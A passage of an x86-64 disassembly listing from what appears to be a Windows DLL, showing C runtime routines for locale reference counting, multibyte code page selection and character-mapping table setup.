   180008175:	f0 44 01 08          	lock add %r9d,(%rax)
   180008179:	48 8d 41 28          	lea    0x28(%rcx),%rax
   18000817d:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   180008183:	48 8d 15 a6 15 01 00 	lea    0x115a6(%rip),%rdx        # 0x180019730
   18000818a:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   18000818e:	74 0c                	je     0x18000819c
   180008190:	48 8b 10             	mov    (%rax),%rdx
   180008193:	48 85 d2             	test   %rdx,%rdx
   180008196:	74 04                	je     0x18000819c
   180008198:	f0 44 01 0a          	lock add %r9d,(%rdx)
   18000819c:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   1800081a1:	74 0d                	je     0x1800081b0
   1800081a3:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   1800081a7:	48 85 d2             	test   %rdx,%rdx
   1800081aa:	74 04                	je     0x1800081b0
   1800081ac:	f0 44 01 0a          	lock add %r9d,(%rdx)
   1800081b0:	48 83 c0 20          	add    $0x20,%rax
   1800081b4:	49 ff c8             	dec    %r8
   1800081b7:	75 ca                	jne    0x180008183
   1800081b9:	48 8b 81 20 01 00 00 	mov    0x120(%rcx),%rax
   1800081c0:	f0 44 01 88 5c 01 00 	lock add %r9d,0x15c(%rax)
   1800081c7:	00 
   1800081c8:	48 8b c1             	mov    %rcx,%rax
   1800081cb:	c3                   	ret
   1800081cc:	40 53                	rex push %rbx
   1800081ce:	48 83 ec 20          	sub    $0x20,%rsp
   1800081d2:	e8 e9 0b 00 00       	call   0x180008dc0
   1800081d7:	48 8b d8             	mov    %rax,%rbx
   1800081da:	8b 0d 98 19 01 00    	mov    0x11998(%rip),%ecx        # 0x180019b78
   1800081e0:	85 88 c8 00 00 00    	test   %ecx,0xc8(%rax)
   1800081e6:	74 18                	je     0x180008200
   1800081e8:	48 83 b8 c0 00 00 00 	cmpq   $0x0,0xc0(%rax)
   1800081ef:	00 
   1800081f0:	74 0e                	je     0x180008200
   1800081f2:	e8 c9 0b 00 00       	call   0x180008dc0
   1800081f7:	48 8b 98 c0 00 00 00 	mov    0xc0(%rax),%rbx
   1800081fe:	eb 2b                	jmp    0x18000822b
   180008200:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180008205:	e8 02 2b 00 00       	call   0x18000ad0c
   18000820a:	90                   	nop
   18000820b:	48 8d 8b c0 00 00 00 	lea    0xc0(%rbx),%rcx
   180008212:	48 8b 15 e7 17 01 00 	mov    0x117e7(%rip),%rdx        # 0x180019a00
   180008219:	e8 26 00 00 00       	call   0x180008244
   18000821e:	48 8b d8             	mov    %rax,%rbx
   180008221:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180008226:	e8 d1 2c 00 00       	call   0x18000aefc
   18000822b:	48 85 db             	test   %rbx,%rbx
   18000822e:	75 08                	jne    0x180008238
   180008230:	8d 4b 20             	lea    0x20(%rbx),%ecx
   180008233:	e8 74 f6 ff ff       	call   0x1800078ac
   180008238:	48 8b c3             	mov    %rbx,%rax
   18000823b:	48 83 c4 20          	add    $0x20,%rsp
   18000823f:	5b                   	pop    %rbx
   180008240:	c3                   	ret
   180008241:	cc                   	int3
   180008242:	cc                   	int3
   180008243:	cc                   	int3
   180008244:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008249:	57                   	push   %rdi
   18000824a:	48 83 ec 20          	sub    $0x20,%rsp
   18000824e:	48 8b fa             	mov    %rdx,%rdi
   180008251:	48 85 d2             	test   %rdx,%rdx
   180008254:	74 43                	je     0x180008299
   180008256:	48 85 c9             	test   %rcx,%rcx
   180008259:	74 3e                	je     0x180008299
   18000825b:	48 8b 19             	mov    (%rcx),%rbx
   18000825e:	48 3b da             	cmp    %rdx,%rbx
   180008261:	74 31                	je     0x180008294
   180008263:	48 89 11             	mov    %rdx,(%rcx)
   180008266:	48 8b ca             	mov    %rdx,%rcx
   180008269:	e8 96 fc ff ff       	call   0x180007f04
   18000826e:	48 85 db             	test   %rbx,%rbx
   180008271:	74 21                	je     0x180008294
   180008273:	48 8b cb             	mov    %rbx,%rcx
   180008276:	e8 ad fe ff ff       	call   0x180008128
   18000827b:	83 3b 00             	cmpl   $0x0,(%rbx)
   18000827e:	75 14                	jne    0x180008294
   180008280:	48 8d 05 89 17 01 00 	lea    0x11789(%rip),%rax        # 0x180019a10
   180008287:	48 3b d8             	cmp    %rax,%rbx
   18000828a:	74 08                	je     0x180008294
   18000828c:	48 8b cb             	mov    %rbx,%rcx
   18000828f:	e8 fc fc ff ff       	call   0x180007f90
   180008294:	48 8b c7             	mov    %rdi,%rax
   180008297:	eb 02                	jmp    0x18000829b
   180008299:	33 c0                	xor    %eax,%eax
   18000829b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800082a0:	48 83 c4 20          	add    $0x20,%rsp
   1800082a4:	5f                   	pop    %rdi
   1800082a5:	c3                   	ret
   1800082a6:	cc                   	int3
   1800082a7:	cc                   	int3
   1800082a8:	48 83 ec 28          	sub    $0x28,%rsp
   1800082ac:	83 3d 15 49 01 00 00 	cmpl   $0x0,0x14915(%rip)        # 0x18001cbc8
   1800082b3:	75 14                	jne    0x1800082c9
   1800082b5:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   1800082ba:	e8 c1 03 00 00       	call   0x180008680
   1800082bf:	c7 05 ff 48 01 00 01 	movl   $0x1,0x148ff(%rip)        # 0x18001cbc8
   1800082c6:	00 00 00 
   1800082c9:	33 c0                	xor    %eax,%eax
   1800082cb:	48 83 c4 28          	add    $0x28,%rsp
   1800082cf:	c3                   	ret
   1800082d0:	40 53                	rex push %rbx
   1800082d2:	48 83 ec 40          	sub    $0x40,%rsp
   1800082d6:	8b d9                	mov    %ecx,%ebx
   1800082d8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800082dd:	33 d2                	xor    %edx,%edx
   1800082df:	e8 10 dc ff ff       	call   0x180005ef4
   1800082e4:	83 25 85 31 01 00 00 	andl   $0x0,0x13185(%rip)        # 0x18001b470
   1800082eb:	83 fb fe             	cmp    $0xfffffffe,%ebx
   1800082ee:	75 12                	jne    0x180008302
   1800082f0:	c7 05 76 31 01 00 01 	movl   $0x1,0x13176(%rip)        # 0x18001b470
   1800082f7:	00 00 00 
   1800082fa:	ff 15 10 8e 00 00    	call   *0x8e10(%rip)        # 0x180011110
   180008300:	eb 15                	jmp    0x180008317
   180008302:	83 fb fd             	cmp    $0xfffffffd,%ebx
   180008305:	75 14                	jne    0x18000831b
   180008307:	c7 05 5f 31 01 00 01 	movl   $0x1,0x1315f(%rip)        # 0x18001b470
   18000830e:	00 00 00 
   180008311:	ff 15 f1 8d 00 00    	call   *0x8df1(%rip)        # 0x180011108
   180008317:	8b d8                	mov    %eax,%ebx
   180008319:	eb 17                	jmp    0x180008332
   18000831b:	83 fb fc             	cmp    $0xfffffffc,%ebx
   18000831e:	75 12                	jne    0x180008332
   180008320:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180008325:	c7 05 41 31 01 00 01 	movl   $0x1,0x13141(%rip)        # 0x18001b470
   18000832c:	00 00 00 
   18000832f:	8b 58 04             	mov    0x4(%rax),%ebx
   180008332:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   180008337:	74 0c                	je     0x180008345
   180008339:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   18000833e:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   180008345:	8b c3                	mov    %ebx,%eax
   180008347:	48 83 c4 40          	add    $0x40,%rsp
   18000834b:	5b                   	pop    %rbx
   18000834c:	c3                   	ret
   18000834d:	cc                   	int3
   18000834e:	cc                   	int3
   18000834f:	cc                   	int3
   180008350:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008355:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000835a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000835f:	57                   	push   %rdi
   180008360:	48 83 ec 20          	sub    $0x20,%rsp
   180008364:	48 8d 59 18          	lea    0x18(%rcx),%rbx
   180008368:	48 8b f1             	mov    %rcx,%rsi
   18000836b:	bd 01 01 00 00       	mov    $0x101,%ebp
   180008370:	48 8b cb             	mov    %rbx,%rcx
   180008373:	44 8b c5             	mov    %ebp,%r8d
   180008376:	33 d2                	xor    %edx,%edx
   180008378:	e8 e3 ce ff ff       	call   0x180005260
   18000837d:	33 c0                	xor    %eax,%eax
   18000837f:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   180008383:	48 89 46 04          	mov    %rax,0x4(%rsi)
   180008387:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   18000838e:	b9 06 00 00 00       	mov    $0x6,%ecx
   180008393:	0f b7 c0             	movzwl %ax,%eax
   180008396:	66 f3 ab             	rep stos %ax,(%rdi)
   180008399:	48 8d 3d 60 10 01 00 	lea    0x11060(%rip),%rdi        # 0x180019400
   1800083a0:	48 2b fe             	sub    %rsi,%rdi
   1800083a3:	8a 04 1f             	mov    (%rdi,%rbx,1),%al
   1800083a6:	88 03                	mov    %al,(%rbx)
   1800083a8:	48 ff c3             	inc    %rbx
   1800083ab:	48 ff cd             	dec    %rbp
   1800083ae:	75 f3                	jne    0x1800083a3
   1800083b0:	48 8d 8e 19 01 00 00 	lea    0x119(%rsi),%rcx
   1800083b7:	ba 00 01 00 00       	mov    $0x100,%edx
   1800083bc:	8a 04 39             	mov    (%rcx,%rdi,1),%al
   1800083bf:	88 01                	mov    %al,(%rcx)
   1800083c1:	48 ff c1             	inc    %rcx
   1800083c4:	48 ff ca             	dec    %rdx
   1800083c7:	75 f3                	jne    0x1800083bc
   1800083c9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800083ce:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1800083d3:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1800083d8:	48 83 c4 20          	add    $0x20,%rsp
   1800083dc:	5f                   	pop    %rdi
   1800083dd:	c3                   	ret
   1800083de:	cc                   	int3
   1800083df:	cc                   	int3
   1800083e0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800083e5:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1800083ea:	55                   	push   %rbp
   1800083eb:	48 8d ac 24 80 fb ff 	lea    -0x480(%rsp),%rbp
   1800083f2:	ff 
   1800083f3:	48 81 ec 80 05 00 00 	sub    $0x580,%rsp
   1800083fa:	48 8b 05 ff 0b 01 00 	mov    0x10bff(%rip),%rax        # 0x180019000
   180008401:	48 33 c4             	xor    %rsp,%rax
   180008404:	48 89 85 70 04 00 00 	mov    %rax,0x470(%rbp)
   18000840b:	48 8b f9             	mov    %rcx,%rdi
   18000840e:	8b 49 04             	mov    0x4(%rcx),%ecx
   180008411:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180008416:	ff 15 fc 8c 00 00    	call   *0x8cfc(%rip)        # 0x180011118
   18000841c:	bb 00 01 00 00       	mov    $0x100,%ebx
   180008421:	85 c0                	test   %eax,%eax
   180008423:	0f 84 35 01 00 00    	je     0x18000855e
   180008429:	33 c0                	xor    %eax,%eax
   18000842b:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180008430:	88 01                	mov    %al,(%rcx)
   180008432:	ff c0                	inc    %eax
   180008434:	48 ff c1             	inc    %rcx
   180008437:	3b c3                	cmp    %ebx,%eax
   180008439:	72 f5                	jb     0x180008430
   18000843b:	8a 44 24 56          	mov    0x56(%rsp),%al
   18000843f:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   180008444:	48 8d 54 24 56       	lea    0x56(%rsp),%rdx
   180008449:	eb 22                	jmp    0x18000846d
   18000844b:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   180008450:	0f b6 c8             	movzbl %al,%ecx
   180008453:	eb 0d                	jmp    0x180008462
   180008455:	3b cb                	cmp    %ebx,%ecx
   180008457:	73 0e                	jae    0x180008467
   180008459:	8b c1                	mov    %ecx,%eax
   18000845b:	c6 44 0c 70 20       	movb   $0x20,0x70(%rsp,%rcx,1)
   180008460:	ff c1                	inc    %ecx
   180008462:	41 3b c8             	cmp    %r8d,%ecx
   180008465:	76 ee                	jbe    0x180008455
   180008467:	48 83 c2 02          	add    $0x2,%rdx
   18000846b:	8a 02                	mov    (%rdx),%al
   18000846d:	84 c0                	test   %al,%al
   18000846f:	75 da                	jne    0x18000844b
   180008471:	8b 47 04             	mov    0x4(%rdi),%eax
   180008474:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   180008479:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   18000847e:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180008482:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   180008489:	44 8b cb             	mov    %ebx,%r9d
   18000848c:	ba 01 00 00 00       	mov    $0x1,%edx
   180008491:	33 c9                	xor    %ecx,%ecx
   180008493:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180008498:	e8 6f 3e 00 00       	call   0x18000c30c
   18000849d:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   1800084a2:	8b 47 04             	mov    0x4(%rdi),%eax
   1800084a5:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   1800084ac:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1800084b0:	48 8d 45 70          	lea    0x70(%rbp),%rax
   1800084b4:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1800084b8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800084bd:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   1800084c2:	44 8b c3             	mov    %ebx,%r8d
   1800084c5:	33 c9                	xor    %ecx,%ecx
   1800084c7:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1800084cb:	e8 2c 3c 00 00       	call   0x18000c0fc
   1800084d0:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   1800084d5:	8b 47 04             	mov    0x4(%rdi),%eax
   1800084d8:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   1800084df:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1800084e3:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   1800084ea:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1800084ee:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800084f3:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   1800084f8:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   1800084fe:	33 c9                	xor    %ecx,%ecx
   180008500:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   180008504:	e8 f3 3b 00 00       	call   0x18000c0fc
   180008509:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   18000850d:	4c 8d 8d 70 01 00 00 	lea    0x170(%rbp),%r9
   180008514:	4c 2b c7             	sub    %rdi,%r8
   180008517:	48 8d 95 70 02 00 00 	lea    0x270(%rbp),%rdx
   18000851e:	48 8d 4f 19          	lea    0x19(%rdi),%rcx
   180008522:	4c 2b cf             	sub    %rdi,%r9
   180008525:	f6 02 01             	testb  $0x1,(%rdx)
   180008528:	74 0a                	je     0x180008534
   18000852a:	80 09 10             	orb    $0x10,(%rcx)
   18000852d:	41 8a 44 08 e7       	mov    -0x19(%r8,%rcx,1),%al
   180008532:	eb 0d                	jmp    0x180008541
   180008534:	f6 02 02             	testb  $0x2,(%rdx)
   180008537:	74 10                	je     0x180008549
   180008539:	80 09 20             	orb    $0x20,(%rcx)
   18000853c:	41 8a 44 09 e7       	mov    -0x19(%r9,%rcx,1),%al
   180008541:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   180008547:	eb 07                	jmp    0x180008550
   180008549:	c6 81 00 01 00 00 00 	movb   $0x0,0x100(%rcx)
   180008550:	48 ff c1             	inc    %rcx
   180008553:	48 83 c2 02          	add    $0x2,%rdx
   180008557:	48 ff cb             	dec    %rbx
   18000855a:	75 c9                	jne    0x180008525
   18000855c:	eb 3f                	jmp    0x18000859d
   18000855e:	33 d2                	xor    %edx,%edx
   180008560:	48 8d 4f 19          	lea    0x19(%rdi),%rcx
   180008564:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   180008568:	41 8d 40 20          	lea    0x20(%r8),%eax
   18000856c:	83 f8 19             	cmp    $0x19,%eax
   18000856f:	77 08                	ja     0x180008579
   180008571:	80 09 10             	orb    $0x10,(%rcx)
   180008574:	8d 42 20             	lea    0x20(%rdx),%eax
   180008577:	eb 0c                	jmp    0x180008585
   180008579:	41 83 f8 19          	cmp    $0x19,%r8d
   18000857d:	77 0e                	ja     0x18000858d
   18000857f:	80 09 20             	orb    $0x20,(%rcx)
   180008582:	8d 42 e0             	lea    -0x20(%rdx),%eax
   180008585:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   18000858b:	eb 07                	jmp    0x180008594
   18000858d:	c6 81 00 01 00 00 00 	movb   $0x0,0x100(%rcx)
   180008594:	ff c2                	inc    %edx
   180008596:	48 ff c1             	inc    %rcx
   180008599:	3b d3                	cmp    %ebx,%edx
   18000859b:	72 c7                	jb     0x180008564
   18000859d:	48 8b 8d 70 04 00 00 	mov    0x470(%rbp),%rcx
   1800085a4:	48 33 cc             	xor    %rsp,%rcx
   1800085a7:	e8 84 cc ff ff       	call   0x180005230
   1800085ac:	4c 8d 9c 24 80 05 00 	lea    0x580(%rsp),%r11
   1800085b3:	00 
   1800085b4:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1800085b8:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   1800085bc:	49 8b e3             	mov    %r11,%rsp
   1800085bf:	5d                   	pop    %rbp
   1800085c0:	c3                   	ret
   1800085c1:	cc                   	int3
   1800085c2:	cc                   	int3
   1800085c3:	cc                   	int3
   1800085c4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800085c9:	57                   	push   %rdi
   1800085ca:	48 83 ec 20          	sub    $0x20,%rsp
   1800085ce:	e8 ed 07 00 00       	call   0x180008dc0
   1800085d3:	48 8b f8             	mov    %rax,%rdi
   1800085d6:	8b 0d 9c 15 01 00    	mov    0x1159c(%rip),%ecx        # 0x180019b78
   1800085dc:	85 88 c8 00 00 00    	test   %ecx,0xc8(%rax)
   1800085e2:	74 13                	je     0x1800085f7
   1800085e4:	48 83 b8 c0 00 00 00 	cmpq   $0x0,0xc0(%rax)
   1800085eb:	00 
   1800085ec:	74 09                	je     0x1800085f7
   1800085ee:	48 8b 98 b8 00 00 00 	mov    0xb8(%rax),%rbx
   1800085f5:	eb 6c                	jmp    0x180008663
   1800085f7:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1800085fc:	e8 0b 27 00 00       	call   0x18000ad0c
   180008601:	90                   	nop
   180008602:	48 8b 9f b8 00 00 00 	mov    0xb8(%rdi),%rbx
   180008609:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   18000860e:	48 3b 1d 0b 11 01 00 	cmp    0x1110b(%rip),%rbx        # 0x180019720
   180008615:	74 42                	je     0x180008659
   180008617:	48 85 db             	test   %rbx,%rbx
   18000861a:	74 1b                	je     0x180008637
   18000861c:	f0 ff 0b             	lock decl (%rbx)
   18000861f:	75 16                	jne    0x180008637
   180008621:	48 8d 05 d8 0d 01 00 	lea    0x10dd8(%rip),%rax        # 0x180019400
   180008628:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   18000862d:	48 3b c8             	cmp    %rax,%rcx
   180008630:	74 05                	je     0x180008637
   180008632:	e8 49 cf ff ff       	call   0x180005580
   180008637:	48 8b 05 e2 10 01 00 	mov    0x110e2(%rip),%rax        # 0x180019720
   18000863e:	48 89 87 b8 00 00 00 	mov    %rax,0xb8(%rdi)
   180008645:	48 8b 05 d4 10 01 00 	mov    0x110d4(%rip),%rax        # 0x180019720
   18000864c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180008651:	f0 ff 00             	lock incl (%rax)
   180008654:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180008659:	b9 0d 00 00 00       	mov    $0xd,%ecx
   18000865e:	e8 99 28 00 00       	call   0x18000aefc
   180008663:	48 85 db             	test   %rbx,%rbx
   180008666:	75 08                	jne    0x180008670
   180008668:	8d 4b 20             	lea    0x20(%rbx),%ecx
   18000866b:	e8 3c f2 ff ff       	call   0x1800078ac
   180008670:	48 8b c3             	mov    %rbx,%rax
   180008673:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   180008678:	48 83 c4 20          	add    $0x20,%rsp
   18000867c:	5f                   	pop    %rdi
   18000867d:	c3                   	ret
   18000867e:	cc                   	int3
   18000867f:	cc                   	int3
   180008680:	48 8b c4             	mov    %rsp,%rax
   180008683:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180008687:	48 89 70 10          	mov    %rsi,0x10(%rax)
   18000868b:	48 89 78 18          	mov    %rdi,0x18(%rax)
   18000868f:	4c 89 70 20          	mov    %r14,0x20(%rax)
   180008693:	41 57                	push   %r15
   180008695:	48 83 ec 30          	sub    $0x30,%rsp
   180008699:	8b f9                	mov    %ecx,%edi
   18000869b:	41 83 cf ff          	or     $0xffffffff,%r15d
   18000869f:	e8 1c 07 00 00       	call   0x180008dc0
   1800086a4:	48 8b f0             	mov    %rax,%rsi
   1800086a7:	e8 18 ff ff ff       	call   0x1800085c4
   1800086ac:	48 8b 9e b8 00 00 00 	mov    0xb8(%rsi),%rbx
   1800086b3:	8b cf                	mov    %edi,%ecx
   1800086b5:	e8 16 fc ff ff       	call   0x1800082d0
   1800086ba:	44 8b f0             	mov    %eax,%r14d
   1800086bd:	3b 43 04             	cmp    0x4(%rbx),%eax
   1800086c0:	0f 84 db 01 00 00    	je     0x1800088a1
   1800086c6:	b9 28 02 00 00       	mov    $0x228,%ecx
   1800086cb:	e8 f4 1a 00 00       	call   0x18000a1c4
   1800086d0:	48 8b d8             	mov    %rax,%rbx
   1800086d3:	33 ff                	xor    %edi,%edi
   1800086d5:	48 85 c0             	test   %rax,%rax
   1800086d8:	0f 84 c8 01 00 00    	je     0x1800088a6
   1800086de:	48 8b 86 b8 00 00 00 	mov    0xb8(%rsi),%rax
   1800086e5:	48 8b cb             	mov    %rbx,%rcx
   1800086e8:	8d 57 04             	lea    0x4(%rdi),%edx
   1800086eb:	44 8d 42 7c          	lea    0x7c(%rdx),%r8d
   1800086ef:	0f 10 00             	movups (%rax),%xmm0
   1800086f2:	0f 11 01             	movups %xmm0,(%rcx)
   1800086f5:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1800086f9:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1800086fd:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   180008701:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   180008705:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   180008709:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   18000870d:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   180008711:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   180008715:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   180008719:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   18000871d:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   180008721:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   180008725:	49 03 c8             	add    %r8,%rcx
   180008728:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   18000872c:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   180008730:	49 03 c0             	add    %r8,%rax
   180008733:	48 ff ca             	dec    %rdx
   180008736:	75 b7                	jne    0x1800086ef
   180008738:	0f 10 00             	movups (%rax),%xmm0
   18000873b:	0f 11 01             	movups %xmm0,(%rcx)
   18000873e:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   180008742:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   180008746:	48 8b 40 20          	mov    0x20(%rax),%rax
   18000874a:	48 89 41 20          	mov    %rax,0x20(%rcx)
   18000874e:	89 3b                	mov    %edi,(%rbx)
   180008750:	48 8b d3             	mov    %rbx,%rdx
   180008753:	41 8b ce             	mov    %r14d,%ecx
   180008756:	e8 69 01 00 00       	call   0x1800088c4
   18000875b:	44 8b f8             	mov    %eax,%r15d
   18000875e:	85 c0                	test   %eax,%eax
   180008760:	0f 85 15 01 00 00    	jne    0x18000887b
   180008766:	48 8b 8e b8 00 00 00 	mov    0xb8(%rsi),%rcx
   18000876d:	4c 8d 35 8c 0c 01 00 	lea    0x10c8c(%rip),%r14        # 0x180019400
   180008774:	f0 ff 09             	lock decl (%rcx)
   180008777:	75 11                	jne    0x18000878a
   180008779:	48 8b 8e b8 00 00 00 	mov    0xb8(%rsi),%rcx
   180008780:	49 3b ce             	cmp    %r14,%rcx
   180008783:	74 05                	je     0x18000878a
   180008785:	e8 f6 cd ff ff       	call   0x180005580
   18000878a:	48 89 9e b8 00 00 00 	mov    %rbx,0xb8(%rsi)
   180008791:	f0 ff 03             	lock incl (%rbx)
   180008794:	f6 86 c8 00 00 00 02 	testb  $0x2,0xc8(%rsi)
   18000879b:	0f 85 05 01 00 00    	jne    0x1800088a6
   1800087a1:	f6 05 d0 13 01 00 01 	testb  $0x1,0x113d0(%rip)        # 0x180019b78
   1800087a8:	0f 85 f8 00 00 00    	jne    0x1800088a6
   1800087ae:	be 0d 00 00 00       	mov    $0xd,%esi
   1800087b3:	8b ce                	mov    %esi,%ecx
   1800087b5:	e8 52 25 00 00       	call   0x18000ad0c
   1800087ba:	90                   	nop
   1800087bb:	8b 43 04             	mov    0x4(%rbx),%eax
   1800087be:	89 05 8c 2c 01 00    	mov    %eax,0x12c8c(%rip)        # 0x18001b450
   1800087c4:	8b 43 08             	mov    0x8(%rbx),%eax
   1800087c7:	89 05 87 2c 01 00    	mov    %eax,0x12c87(%rip)        # 0x18001b454
   1800087cd:	48 8b 83 20 02 00 00 	mov    0x220(%rbx),%rax
   1800087d4:	48 89 05 8d 2c 01 00 	mov    %rax,0x12c8d(%rip)        # 0x18001b468
   1800087db:	8b d7                	mov    %edi,%edx
   1800087dd:	4c 8d 05 1c 78 ff ff 	lea    -0x87e4(%rip),%r8        # 0x180000000
   1800087e4:	89 54 24 20          	mov    %edx,0x20(%rsp)
   1800087e8:	83 fa 05             	cmp    $0x5,%edx
   1800087eb:	7d 15                	jge    0x180008802
   1800087ed:	48 63 ca             	movslq %edx,%rcx
   1800087f0:	0f b7 44 4b 0c       	movzwl 0xc(%rbx,%rcx,2),%eax
   1800087f5:	66 41 89 84 48 58 b4 	mov    %ax,0x1b458(%r8,%rcx,2)
   1800087fc:	01 00 
   1800087fe:	ff c2                	inc    %edx
   180008800:	eb e2                	jmp    0x1800087e4
   180008802:	8b d7                	mov    %edi,%edx
   180008804:	89 54 24 20          	mov    %edx,0x20(%rsp)
   180008808:	81 fa 01 01 00 00    	cmp    $0x101,%edx
   18000880e:	7d 13                	jge    0x180008823
   180008810:	48 63 ca             	movslq %edx,%rcx
   180008813:	8a 44 19 18          	mov    0x18(%rcx,%rbx,1),%al
   180008817:	42 88 84 01 f0 91 01 	mov    %al,0x191f0(%rcx,%r8,1)
   18000881e:	00 
   18000881f:	ff c2                	inc    %edx
   180008821:	eb e1                	jmp    0x180008804
   180008823:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   180008827:	81 ff 00 01 00 00    	cmp    $0x100,%edi
   18000882d:	7d 16                	jge    0x180008845
   18000882f:	48 63 cf             	movslq %edi,%rcx
   180008832:	8a 84 19 19 01 00 00 	mov    0x119(%rcx,%rbx,1),%al
   180008839:	42 88 84 01 00 93 01 	mov    %al,0x19300(%rcx,%r8,1)
   180008840:	00 
   180008841:	ff c7                	inc    %edi
   180008843:	eb de                	jmp    0x180008823
   180008845:	48 8b 0d d4 0e 01 00 	mov    0x10ed4(%rip),%rcx        # 0x180019720
   18000884c:	83 c8 ff             	or     $0xffffffff,%eax
   18000884f:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   180008853:	ff c8                	dec    %eax
   180008855:	75 11                	jne    0x180008868
   180008857:	48 8b 0d c2 0e 01 00 	mov    0x10ec2(%rip),%rcx        # 0x180019720
   18000885e:	49 3b ce             	cmp    %r14,%rcx
   180008861:	74 05                	je     0x180008868
   180008863:	e8 18 cd ff ff       	call   0x180005580
   180008868:	48 89 1d b1 0e 01 00 	mov    %rbx,0x10eb1(%rip)        # 0x180019720
   18000886f:	f0 ff 03             	lock incl (%rbx)
   180008872:	8b ce                	mov    %esi,%ecx
   180008874:	e8 83 26 00 00       	call   0x18000aefc
   180008879:	eb 2b                	jmp    0x1800088a6
   18000887b:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000887e:	75 26                	jne    0x1800088a6
   180008880:	4c 8d 35 79 0b 01 00 	lea    0x10b79(%rip),%r14        # 0x180019400
   180008887:	49 3b de             	cmp    %r14,%rbx
   18000888a:	74 08                	je     0x180008894
   18000888c:	48 8b cb             	mov    %rbx,%rcx
   18000888f:	e8 ec cc ff ff       	call   0x180005580
   180008894:	e8 97 ed ff ff       	call   0x180007630
   180008899:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000889f:	eb 05                	jmp    0x1800088a6
   1800088a1:	33 ff                	xor    %edi,%edi
   1800088a3:	44 8b ff             	mov    %edi,%r15d
   1800088a6:	41 8b c7             	mov    %r15d,%eax
   1800088a9:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800088ae:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1800088b3:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1800088b8:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
